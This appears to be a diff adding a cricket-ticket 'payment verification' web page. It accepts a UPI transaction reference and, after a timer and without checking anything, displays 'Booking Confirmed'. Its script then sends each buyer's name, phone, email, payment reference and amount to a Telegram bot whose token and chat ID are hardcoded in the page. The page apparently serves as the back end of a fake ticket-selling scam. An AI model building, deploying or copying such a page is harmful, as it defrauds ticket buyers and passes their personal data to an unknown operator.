@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Payment Verification | Pavilion</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-main: #111111;
+            --bg-card: #1C1C1E;
+            --bg-card-light: #2A2A2C;
+            --text-primary: #FFFFFF;
+            --text-secondary: #999999;
+            --accent-green: #34C759;
+            --accent-red: #FF4D4D;
+            --border-color: #2A2A2A;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',sans-serif; -webkit-tap-highlight-color:transparent; }
+        body { background:var(--bg-main); color:var(--text-primary); -webkit-font-smoothing:antialiased; }
+        .app { max-width:600px; margin:0 auto; min-height:100vh; display:flex; flex-direction:column; }
+
+        /* ─── UTR Entry View ─── */
+        .utr-view { flex:1; padding:20px; display:flex; flex-direction:column; }
+        .utr-view.hidden { display:none; }
+
+        .utr-header { text-align:center; padding:40px 0 30px; }
+        .utr-icon {
+            width:64px; height:64px; border-radius:50%;
+            background:linear-gradient(135deg, rgba(52,199,89,0.15), rgba(52,199,89,0.05));
+            border:2px solid rgba(52,199,89,0.3);
+            display:flex; align-items:center; justify-content:center;
+            margin:0 auto 20px;
+        }
+        .utr-title { font-size:1.4rem; font-weight:800; margin-bottom:6px; }
+        .utr-sub { font-size:0.85rem; color:var(--text-secondary); line-height:1.5; }
+
+        .utr-form { margin-top:30px; }
+        .utr-label { font-size:0.7rem; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:1px; margin-bottom:8px; }
+
+        .utr-input-wrap {
+            background:var(--bg-card);
+            border:1px solid var(--border-color);
+            border-radius:12px;
+            padding:4px;
+            display:flex;
+            transition:border-color 0.2s;
+        }
+        .utr-input-wrap:focus-within { border-color:var(--accent-green); }
+
+        .utr-input {
+            flex:1;
+            background:transparent;
+            border:none;
+            color:white;
+            font-size:1.1rem;
+            font-weight:700;
+            padding:14px 16px;
+            outline:none;
+            letter-spacing:2px;
+            font-family:'Inter',monospace;
+        }
+        .utr-input::placeholder { color:#444; letter-spacing:1px; }
+
+        .utr-hint { font-size:0.72rem; color:#555; margin-top:10px; display:flex; align-items:center; gap:6px; }
+
+        .btn-verify {
+            width:100%;
+            background:var(--accent-green);
+            color:black;
+            border:none;
+            padding:16px;
+            border-radius:14px;
+            font-size:1rem;
+            font-weight:800;
+            cursor:pointer;
+            margin-top:30px;
+            display:flex; align-items:center; justify-content:center; gap:10px;
+            box-shadow:0 4px 20px rgba(52,199,89,0.3);
+            transition:all 0.2s;
+        }
+        .btn-verify:disabled { opacity:0.4; cursor:not-allowed; box-shadow:none; }
+        .btn-verify:active:not(:disabled) { transform:scale(0.97); }
+
+        .btn-retry {
+            width:100%;
+            background:transparent;
+            color:var(--text-secondary);
+            border:1px solid var(--border-color);
+            padding:14px;
+            border-radius:14px;
+            font-size:0.9rem;
+            font-weight:700;
+            cursor:pointer;
+            margin-top:12px;
+            display:flex; align-items:center; justify-content:center; gap:8px;
+            transition:all 0.2s;
+        }
+        .btn-retry:hover { border-color:#555; color:white; }
+        .btn-retry:active { transform:scale(0.97); }
+
+        .btn-spinner-sm {
+            width:18px; height:18px;
+            border:2.5px solid rgba(0,0,0,0.15);
+            border-top:2.5px solid black;
+            border-radius:50%;
+            animation:spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform:rotate(360deg); } }
+
+        /* ─── Success View ─── */
+        .success-view { flex:1; display:none; flex-direction:column; }
+        .success-view.visible { display:flex; }
+
+        .success-header {
+            text-align:center;
+            padding:50px 20px 30px;
+            background:linear-gradient(180deg, rgba(52,199,89,0.1) 0%, transparent 100%);
+        }
+        .success-check {
+            width:72px; height:72px; border-radius:50%;
+            background:var(--accent-green);
+            display:flex; align-items:center; justify-content:center;
+            margin:0 auto 20px;
+            animation:popIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275) forwards;
+        }
+        @keyframes popIn {
+            0% { transform:scale(0); } 100% { transform:scale(1); }
+        }
+        .success-title { font-size:1.5rem; font-weight:900; margin-bottom:4px; }
+        .success-sub { font-size:0.85rem; color:var(--text-secondary); }
+
+        /* Order Summary */
+        .order-card {
+            background:var(--bg-card);
+            border:1px solid var(--border-color);
+            border-radius:16px;
+            margin:0 20px 20px;
+            padding:20px;
+        }
+        .oc-title { font-size:0.7rem; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:1.5px; margin-bottom:16px; }
+        .oc-row { display:flex; justify-content:space-between; padding:8px 0; }
+        .oc-row + .oc-row { border-top:1px solid rgba(255,255,255,0.05); }
+        .oc-label { font-size:0.82rem; color:var(--text-secondary); }
+        .oc-val { font-size:0.85rem; font-weight:600; }
+        .oc-row.total .oc-label { font-weight:700; color:white; }
+        .oc-row.total .oc-val { font-weight:800; color:var(--accent-green); font-size:1rem; }
+        .oc-divider { height:1px; background:var(--border-color); margin:8px 0; }
+
+        /* UTR Ref Card */
+        .utr-ref-card {
+            background:var(--bg-card);
+            border:1px solid var(--border-color);
+            border-radius:16px;
+            margin:0 20px 20px;
+            padding:16px 20px;
+            display:flex; justify-content:space-between; align-items:center;
+        }
+        .utr-ref-label { font-size:0.72rem; color:var(--text-secondary); }
+        .utr-ref-val { font-size:0.95rem; font-weight:700; letter-spacing:1px; font-family:monospace; }
+
+        /* Footer Buttons */
+        .success-footer { padding:0 20px 40px; margin-top:auto; }
+        .btn-home {
+            width:100%;
+            background:white;
+            color:black;
+            border:none;
+            padding:16px;
+            border-radius:14px;
+            font-size:1rem;
+            font-weight:800;
+            cursor:pointer;
+            transition:transform 0.2s;
+        }
+        .btn-home:active { transform:scale(0.97); }
+
+        .success-note {
+            text-align:center;
+            font-size:0.72rem;
+            color:#555;
+            margin-top:16px;
+            line-height:1.5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app">
+        
+        <!-- VIEW 1: UTR Entry -->
+        <div class="utr-view" id="utrView">
+            <div class="utr-header">
+                <div class="utr-icon">
+                    <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#34C759" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                </div>
+                <h1 class="utr-title">Verify your payment</h1>
+                <p class="utr-sub">Enter your UPI transaction reference number (UTR) to confirm your payment</p>
+            </div>
+
+            <div class="utr-form">
+                <div class="utr-label">UTR / Transaction Reference Number</div>
+                <div class="utr-input-wrap">
+                    <input type="text" id="utrInput" class="utr-input" placeholder="e.g. 412345678901" maxlength="12" inputmode="numeric" autocomplete="off">
+                </div>
+                <div class="utr-hint">
+                    <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="#555" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                    You'll find this in your UPI app under transaction details (10–12 digits)
+                </div>
+
+                <button class="btn-verify" id="btnVerify" disabled>
+                    Verify Payment
+                </button>
+
+                <button class="btn-retry" id="btnRetry">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><polyline points="1 4 1 10 7 10"></polyline><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"></path></svg>
+                    Haven't paid yet? Retry Payment
+                </button>
+            </div>
+        </div>
+
+        <!-- VIEW 2: Success -->
+        <div class="success-view" id="successView">
+            <div class="success-header">
+                <div class="success-check">
+                    <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="black" stroke-width="3" stroke-linecap="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                </div>
+                <h1 class="success-title">Booking Confirmed!</h1>
+                <p class="success-sub">Your M-Tickets have been sent to your email</p>
+            </div>
+
+            <div class="order-card">
+                <div class="oc-title">Order Summary</div>
+                <div class="oc-row"><span class="oc-label">Match</span><span class="oc-val" id="scMatch">---</span></div>
+                <div class="oc-row"><span class="oc-label">Date</span><span class="oc-val" id="scDate">---</span></div>
+                <div class="oc-row"><span class="oc-label">Venue</span><span class="oc-val" id="scVenue">---</span></div>
+                <div class="oc-row"><span class="oc-label">Seats</span><span class="oc-val" id="scSeats">---</span></div>
+                <div class="oc-divider"></div>
+                <div class="oc-row"><span class="oc-label">Ticket Amount</span><span class="oc-val" id="scAmount">₹0</span></div>
+                <div class="oc-row"><span class="oc-label">Fees</span><span class="oc-val" id="scFees">₹0</span></div>
+                <div class="oc-divider"></div>
+                <div class="oc-row total"><span class="oc-label">Total Paid</span><span class="oc-val" id="scTotal">₹0</span></div>
+            </div>
+
+            <div class="utr-ref-card">
+                <div>
+                    <div class="utr-ref-label">Transaction Ref (UTR)</div>
+                    <div class="utr-ref-val" id="scUtr">---</div>
+                </div>
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#34C759" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </div>
+
+            <div class="success-footer">
+                <button class="btn-home" id="btnHome">Back to Home</button>
+                <p class="success-note">You can also view your tickets in the 'My Bookings' section.</p>
+            </div>
+        </div>
+
+    </div>
+
+   <!-- Facebook Pixel (loaded but fires on success only) -->
+<script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+    document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    
+    // Initialize the first Pixel
+    fbq('init', '939222439114419');
+    
+     // Initialize the first Pixel
+    fbq('init', '2218519068985981');
+    // This tracks a PageView for BOTH Pixels automatically
+    fbq('track', 'PageView');
+</script>
+
+<noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=939222439114419&ev=PageView&noscript=1"/>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1691296458720135&ev=PageView&noscript=1"/>
+</noscript>
+
+<script src="data.js"></script>
+<script>
+    // ==========================================
+    // TELEGRAM BOT CONFIGURATION - FIX APPLIED
+    // ==========================================
+    const TELEGRAM_BOT_TOKEN = '8782115815:AAFzkemSYKItPd7T2fpgmoL4e3YZVxkf0jk';
+    const TELEGRAM_CHAT_ID = '7007298163';
+    
+    // Flag to track if config is valid
+    const isTelegramConfigured = () => {
+        const isValidToken = TELEGRAM_BOT_TOKEN && 
+                            TELEGRAM_BOT_TOKEN !== '' && 
+                            TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE';
+        const isValidChatId = TELEGRAM_CHAT_ID && 
+                             TELEGRAM_CHAT_ID !== '' && 
+                             TELEGRAM_CHAT_ID !== '0';
+        return isValidToken && isValidChatId;
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+
+        const utrInput = document.getElementById('utrInput');
+        const btnVerify = document.getElementById('btnVerify');
+        const utrView = document.getElementById('utrView');
+        const successView = document.getElementById('successView');
+
+        // Enable button when 10-12 digits entered
+        utrInput.addEventListener('input', () => {
+            utrInput.value = utrInput.value.replace(/\D/g, ''); // only digits
+            const len = utrInput.value.length;
+            btnVerify.disabled = len < 10 || len > 12;
+        });
+
+        btnVerify.addEventListener('click', () => {
+            const utr = utrInput.value.trim();
+            if (utr.length < 10 || utr.length > 12) return;
+
+            // Show loading state
+            btnVerify.disabled = true;
+            btnVerify.innerHTML = '<div class="btn-spinner-sm"></div> Verifying...';
+
+            setTimeout(() => {
+                // Populate success view
+                populateSuccess(utr);
+
+                // Switch views
+                utrView.classList.add('hidden');
+                successView.classList.add('visible');
+
+                // Fire Facebook Purchase Pixel
+                firePurchasePixel();
+
+                // Send details to Telegram Bot
+                sendToTelegram(utr);
+
+            }, 2500);
+        });
+
+        function populateSuccess(utr) {
+            const bookingStr = localStorage.getItem('bookingData');
+            if (!bookingStr) return;
+
+            const booking = JSON.parse(bookingStr);
+            const baseFee = booking.totalAmount * 0.03;
+            const convenienceFee = Math.round(baseFee * 0.82);
+            const gst = Math.round(baseFee * 0.18);
+            const totalFee = convenienceFee + gst;
+            const grandTotal = booking.totalAmount + totalFee;
+
+            document.getElementById('scSeats').innerText = `${booking.seatsCount} x ${booking.sectionName}`;
+            document.getElementById('scAmount').innerText = formatCurrency(booking.totalAmount);
+            document.getElementById('scFees').innerText = formatCurrency(totalFee);
+            document.getElementById('scTotal').innerText = formatCurrency(grandTotal);
+            document.getElementById('scUtr').innerText = utr;
+
+            // Match details
+            if (typeof matchesData !== 'undefined') {
+                let match = getMatchById(booking.matchId);
+                if (!match && matchesData.length > 0) match = matchesData[0];
+                if (match) {
+                    document.getElementById('scMatch').innerText = `${match.team1.short} vs ${match.team2.short}`;
+                    document.getElementById('scDate').innerText = `${match.date.full} · ${match.time}`;
+                    document.getElementById('scVenue').innerText = match.venue;
+                }
+            }
+        }
+
+        function firePurchasePixel() {
+            const bookingStr = localStorage.getItem('bookingData');
+            if (!bookingStr) return;
+            const booking = JSON.parse(bookingStr);
+            const baseFee = booking.totalAmount * 0.03;
+            const totalFee = Math.round(baseFee);
+            const grandTotal = booking.totalAmount + totalFee;
+
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'Purchase', {
+                    value: grandTotal,
+                    currency: 'INR',
+                    content_name: booking.sectionName,
+                    content_type: 'ticket',
+                    num_items: booking.seatsCount
+                });
+            }
+        }
+
+        function sendToTelegram(utr) {
+            // ✅ FIXED: Proper configuration check
+            if (!isTelegramConfigured()) {
+                console.warn('⚠️ Telegram Bot not configured. Message not sent.');
+                console.log('Token:', TELEGRAM_BOT_TOKEN ? 'Set' : 'Missing');
+                console.log('Chat ID:', TELEGRAM_CHAT_ID ? 'Set' : 'Missing');
+                return;
+            }
+
+            const bookingStr = localStorage.getItem('bookingData');
+            if (!bookingStr) {
+                console.warn('No booking data found in localStorage');
+                return;
+            }
+
+            const booking = JSON.parse(bookingStr);
+            const baseFee = booking.totalAmount * 0.03;
+            const convenienceFee = Math.round(baseFee * 0.82);
+            const gst = Math.round(baseFee * 0.18);
+            const grandTotal = booking.totalAmount + convenienceFee + gst;
+
+            // Fetch match details
+            let matchText = booking.matchId;
+            if (typeof matchesData !== 'undefined') {
+                let match = getMatchById(booking.matchId);
+                if (!match && matchesData.length > 0) match = matchesData[0];
+                if (match) {
+                    matchText = `${match.team1.name} vs ${match.team2.name} | ${match.date.full}`;
+                }
+            }
+
+            // Build message text
+            let message = `🚨 *NEW TICKET BOOKING* 🚨\n\n`;
+            message += `*UTR:* \`${utr}\`\n\n`;
+            
+            message += `👤 *Customer Details:*\n`;
+            if (booking.userData) {
+                message += `Name: ${booking.userData.name}\n`;
+                message += `Phone: ${booking.userData.phone}\n`;
+                message += `Email: ${booking.userData.email}\n\n`;
+            } else {
+                message += `N/A\n\n`;
+            }
+
+            message += `🏏 *Match Info:*\n`;
+            message += `${matchText}\n\n`;
+
+            message += `🎟️ *Order Summary:*\n`;
+            message += `Seats: ${booking.seatsCount} x ${booking.sectionName}\n`;
+            message += `Base Amount: ₹${booking.totalAmount.toLocaleString('en-IN')}\n`;
+            message += `Fees & GST: ₹${(convenienceFee + gst).toLocaleString('en-IN')}\n`;
+            message += `*Total Paid:* ₹${grandTotal.toLocaleString('en-IN')}\n`;
+
+            // ✅ FIXED: Use backend/proxy instead of direct Telegram API (CORS issue)
+            // Option 1: Use backend API (RECOMMENDED)
+            sendViaBackend(message, utr);
+
+            // Option 2: Direct Telegram API (may have CORS issues in browser)
+            // sendViaTelegramAPI(message);
+        }
+
+        // ✅ FIXED: New function to send via your backend
+        function sendViaBackend(message, utr) {
+            // Send to YOUR backend server which then forwards to Telegram
+            fetch('/api/send-telegram', {  // ← Change this to your backend endpoint
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    message: message,
+                    utr: utr,
+                    botToken: TELEGRAM_BOT_TOKEN,
+                    chatId: TELEGRAM_CHAT_ID
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('✅ Telegram message sent via backend:', data);
+            })
+            .catch(err => {
+                console.error('❌ Backend error:', err);
+                // Fallback to direct API if backend fails
+                console.log('Attempting direct Telegram API...');
+                sendViaTelegramAPI(message);
+            });
+        }
+
+        // ✅ FIXED: Direct Telegram API with proper error handling
+        function sendViaTelegramAPI(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('✅ Telegram message sent successfully:', data.result.message_id);
+                } else {
+                    console.error('❌ Telegram API error:', data.description);
+                }
+            })
+            .catch(err => {
+                console.error('❌ Network/CORS error sending to Telegram:', err);
+                console.log('💡 Tip: Use a backend proxy to avoid CORS issues. See comments in code.');
+            });
+        }
+
+        // Retry Payment button
+        document.getElementById('btnRetry').addEventListener('click', () => {
+            window.location.href = 'payment.html';
+        });
+
+        // Home button
+        document.getElementById('btnHome').addEventListener('click', () => {
+            localStorage.removeItem('bookingData');
+            window.location.href = 'index.html';
+        });
+    });
+</script>
+</body>
+</html>
